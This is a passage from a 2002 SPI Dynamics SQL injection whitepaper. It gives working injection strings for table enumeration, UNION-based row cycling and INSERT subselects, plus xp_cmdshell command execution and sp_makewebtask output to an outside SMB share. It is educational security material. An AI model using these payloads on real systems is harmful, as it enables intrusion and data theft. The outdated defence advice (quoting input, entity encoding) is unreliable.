of all of the tables and columns in the database.  To get a list of user tables in SQL Server, use 
the following injection query, modified to fit whatever circumstances you find yourself in, of 
course: 
SELECT name FROM sysobjects WHERE xtype = 'U'
This will return the names of all of the user-defined (that's what xtype = 'U'
does) tables in the database.  Once you find one that looks interesting (we'll use Orders), 
you can get the names of the fields in that table with an injection query similar to this: 
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 21 
SELECT name FROM syscolumns WHERE id = (SELECT id FROM
sysobjects WHERE name = 'Orders') 
3.2.10. Single record cycling 
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 22 
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 23 
Figure 8: Single record cycling 
If possible, use an application that is designed to return as many results as possible.  A 
search tool is ideal because they are made to return results from many different rows at once.  
Some applications are designed to use only one recordset in their output at a time, and ignore 
the rest.  If you're stuck with a single product display application, it's okay.  You can 
manipulate your injection query to allow you to slowly, but surely, get your desired 
information back in full.  This is accomplished by adding qualifiers to the WHERE clause that 
prevent certain rows’ information from being selected.  Let's say you started with this injection 
string: 
' UNION ALL SELECT name, FieldTwo, FieldThree FROM TableOne
WHERE ''='
And you got the first values in FieldOne, FieldTwo and FieldThree injected 
into your document.  Let's say the values of FieldOne, FieldTwo and FieldThree were 
"Alpha", "Beta" and "Delta", respectively.  Your second injection string would be: 
' UNION ALL SELECT FieldOne, FieldTwo, FieldThree FROM
TableOne WHERE FieldOne NOT IN ('Alpha') AND FieldTwo NOT IN
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 24 
('Beta') AND FieldThree NOT IN ('Delta') AND ''='
The NOT IN VALUES clause makes sure that the information that you already know 
will not be returned again, so the next row in the table will be used instead.  Let’s say these 
values were "AlphaAlpha", "BetaBeta" and "DeltaDelta"... 
' UNION ALL SELECT FieldOne, FieldTwo, FieldThree FROM TableOne
WHERE FieldOne NOT IN ('Alpha', 'AlphaAlpha') AND FieldTwo NOT
IN ('Beta', 'BetaBeta') AND FieldThree NOT IN ('Delta',
'DeltaDelta') AND ''='
This will prevent both the first and second sets of values you know from being 
returned.  You just keep adding arguments to VALUES until there are none left to return.  Yes, 
this makes for some rather large and cumbersome queries while going through a table with 
many rows, but it's the best method that there is.
3.3. INSERT 
3.3.1. Insert basics 
The INSERT keyword is used to add information to the database.  Common uses of 
INSERTs in web applications include user registrations, bulletin boards, adding items to 
shopping carts, etc.  Checking for vulnerabilities with INSERT statements is the same as doing 
it with WHEREs.  You may not want to try to use INSERTs if avoiding detection is an 
important issue.  INSERT injection attempts often result in rows in the database that are 
flooded with single quotes and SQL keywords from the reverse-engineering process.  
Depending on how watchful the administrator is and what is being done with the information 
in that database, it may be noticed.  Having said that, here's how INSERT injection differs 
from SELECT injection. 
Let's say you're on a site that allows user registration of some kind.  It provides a form 
where you enter your name, address, phone number, etc.  After you've submitted the form, you 
can go to a page where it displays this information and gives you an option to edit it.  This is 
what you want.  In order to take advantage of an INSERT vulnerability, you must be able to 
view the information that you've submitted.  It doesn't matter where it is.  Maybe when you log 
in it greets you with the value it has stored for your name in the database.  Maybe they send 
you spam mail with the name value in it.  Who knows.  Find a way to view at least some of the 
information you've entered. 
3.3.2. Injecting subselects 
An INSERT query looks something like this: 
INSERT INTO TableName VALUES ('Value One', 'Value Two', 'Value
Three')
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 25 
You want to be able to manipulate the arguments in the VALUES clause to make them 
retrieve other data.  We can do this using subselects.  Let's say the code looks like this: 
SQLString = "INSERT INTO TableName VALUES ('" & strValueOne &
"', '" & strValueTwo & "', '" & strValueThree & "')"
And we fill out the form like this: 
Name:  ' + (SELECT TOP 1 FieldName FROM TableName) + '
Email:  PI:EMAIL
Phone:  333-333-3333 
Making the SQL statement look like this: 
INSERT INTO TableName VALUES ('' + (SELECT TOP 1 FieldName FROM
TableName) + '', 'PI:EMAIL', '333-333-3333')
When you go to the preferences page and view your user's information, you'll see the 
first value in FieldName where the user's name would normally be.  Unless you use TOP 1 
in your subselect, you'll get back an error message saying that the subselect returned too many 
records.  You can go through all of the rows in the table using NOT IN () the same way it is 
used in single record cycling. 
3.4. SQL Server Stored Procedures 
3.4.1. Stored procedure basics 
An out-of-the-box install of Microsoft SQL Server has over one thousand stored 
procedures.  If you can get SQL injection working on a web application that uses SQL Server 
as it's backend, you can use these stored procedures to pull off some remarkable feats.  I will 
here discuss a few procedures of particular interest.  Depending on the permissions of the web 
application's database user, some, all or none of these may work.  The first thing you should 
know about stored procedure injection is that there is a good chance that you will not see the 
stored procedure's output in the same way you get values back with regular injection.  
Depending on what you're trying to accomplish, you may not need to get data back at all.  You 
can find other means of getting your data returned to you. 
Procedure injection is much easier than regular query injection.  Procedure injection 
into a quoted vulnerability should look something like this: 
simplequoted.asp?city=seattle';EXEC master.dbo.xp_cmdshell
'cmd.exe dir c:
Notice how a valid argument is supplied at the beginning and followed by a quote and 
the final argument to the stored procedure has no closing quote.  This will satisfy the syntax 
requirements inherent in most quoted vulnerabilities.  You may also have to deal with 
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 26 
parentheses, additional WHERE statements, etc., but after that, there's no column matching or 
data types to worry about.  This makes it possible to export vulnerability in the same way that 
you would with applications that do not return error messages.  On to a couple of my favorite 
stored procedures.   
3.4.2. xp_cmdshell 
xp_cmdshell {'command_string'} [, no_output]
master.dbo.xp_cmdshell is the holy grail of stored procedures.  It takes a 
single argument, which is the command that you want to be executed at SQL Server's user 
level.  The problem?  It's not likely to be available unless the SQL Server user that the web 
application is using is sa.
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 27 
3.4.3. sp_makewebtask 
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 28 
Figure 9: Using sp_makewebtask 
sp_makewebtask [@outputfile =] 'outputfile', [@query =] 'query'
Another favorite of mine is master.dbo.sp_makewebtask.  As you can see, its 
arguments are an output file location and an SQL statement.  sp_makewebtask takes a 
query and builds a webpage containing its output.  Note that you can use a UNC pathname as 
an output location.  This means that the output file can be placed on any system connected to 
the Internet that has a publicly writable SMB share on it.  (The SMB request must generate no 
challenge for authentication at all).  If there is a firewall restricting the server's access to the 
Internet, try making the output file on the website itself.  (You'll need to either know or guess 
the webroot directory).  Also be aware that the query argument can be any valid T-SQL 
statement, including execution of other stored procedures.  Making "EXEC xp_cmdshell
'dir c:'" the @query argument will give you the output of "dir c:" in the webpage.  
When nesting quotes, remember to alternate single and double quotes. 
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 29 
4. 
Solutions 
4.1. Data sanitization 
All client-supplied data needs to be cleansed of any characters or strings that could 
possibly be used maliciously.  This should be done for all applications, not just those that use 
SQL queries. Stripping quotes or putting backslashes in front of them is nowhere near enough.  
The best way to filter your data is with a default-deny regular expression.  Make it so that you 
only include that type of characters that you want.  For instance, the following regexp will 
return only letters and numbers: 
s/[^0-9a-zA-Z]//g
Make your filter as specific as possible.  Whenever possible use only numbers.  After 
that, numbers and letters only.  If you need to include symbols or punctuation of any kind, 
make absolutely sure to convert them to HTML substitutes, such as "&quote;" or "&gt;".  
For instance, if the user is submitting an email address, allow only "@", "_", "." and "-" in 
addition to numbers and letters to be used, and only after those characters have been converted 
to their html substitutes. 
4.2. Secure SQL web application coding 
There are also a few SQL injection specific rules.  First, prepend and append a quote to 
all user input.  Even if the data is numeric.  Next, limit the rights of the database user that the 
web application uses.  Don't give that user access to all of the system stored procedures if that 
user only needs access to a handful of user-defined ones.   
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 30 
5. 
Database server system tables 
This section includes the names of system tables that are useful in SQL injection.  You 
can get listings of the columns in each of these tables by searching for them on Google. 
5.1. MS SQL Server 
sysobjects
syscolumns
5.2. MS Access Server 
MSysACEs
MSysObjects
MSysQueries
MSysRelationships
5.3. Oracle 
SYS.USER_OBJECTS
SYS.TAB
SYS.USER_TABLES
SYS.USER_VIEWS
SYS.ALL_TABLES
SYS.USER_TAB_COLUMNS
SYS.USER_CONSTRAINTS
SYS.USER_TRIGGERS
SYS.USER_CATALOG
© 2002 SPI Dynamics, Inc. All Right Reserved. No reproduction or redistribution without written permission.  
Page 31 
6. 
The Business Case for Application Security 
Whether a security breach is made public or confined internally, the fact that a hacker has laid 
eyes on your sensitive data is of concern to your company, your shareholders, and most 
importantly, your customers. 
SPI Dynamics has found that the majority of companies that take a proactive approach to 
application security, and that continuously engage in the application security process, are better 
protected.  In the long run, these companies enjoy a higher ROI on their e-business ventures. 
About SPI Dynamics, Inc. 
Founded in 2000 by a team of accomplished Web security specialists, SPI Dynamics mission is 
to develop security products and services that systematically detect, prevent, and communicate 
Web application vulnerabilities and intrusions for any online business, and provide intelligent 
methodological approaches for resolution of discovered vulnerabilities. Based in Atlanta, 
Georgia, SPI Dynamics is a privately held company. SPI Dynamics products are used in a wide 
variety of industries, including financial management, manufacturing, healthcare, 
telecommunications, and government. 
For further information please contact: 
SPI Dynamics, Inc. 
115 Perimeter Center Place 
Suite 270 
Atlanta, GA 30346 
Toll-free: 1-866-SPI-2700 
Direct: 678-781-4800 
Fax: 678-781-4850 
PI:EMAIL